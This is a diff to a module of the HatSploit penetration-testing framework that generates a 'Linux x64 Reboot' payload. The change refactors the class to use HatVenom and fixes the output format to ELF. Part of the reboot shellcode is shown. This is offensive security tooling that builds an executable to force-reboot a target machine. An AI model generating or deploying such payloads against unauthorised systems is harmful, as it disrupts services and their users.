@@ -25,10 +25,10 @@
 #
 
 from core.lib.payload import Payload
-from utils.payload.payload import PayloadGenerator
+from utils.hatvenom.hatvenom import HatVenom
 
 
-class HatSploitPayload(Payload, PayloadGenerator):
+class HatSploitPayload(Payload, HatVenom):
     details = {
         'Category': "stager",
         'Name': "Linux x64 Reboot",
@@ -49,22 +49,7 @@ class HatSploitPayload(Payload, PayloadGenerator):
         'Type': "one_side"
     }
 
-    options = {
-        'FORMAT': {
-            'Description': "Executable format.",
-            'Value': "elf",
-            'Type': None,
-            'Required': True
-        }
-    }
-
     def run(self):
-        executable_format = self.parse_options(self.options)
-
-        if executable_format not in self.formats.keys():
-            self.output_error("Invalid executable format!")
-            return
-
         self.output_process("Generating shellcode...")
         shellcode = (
             b"\xba\xdc\xfe\x21\x43"  # mov    $0x4321fedc,%edx
@@ -75,6 +60,6 @@ class HatSploitPayload(Payload, PayloadGenerator):
         )
 
         self.output_process("Generating payload...")
-        payload = self.generate(executable_format, 'x64', shellcode)
+        payload = self.generate('elf', 'x64', shellcode)
 
         return payload
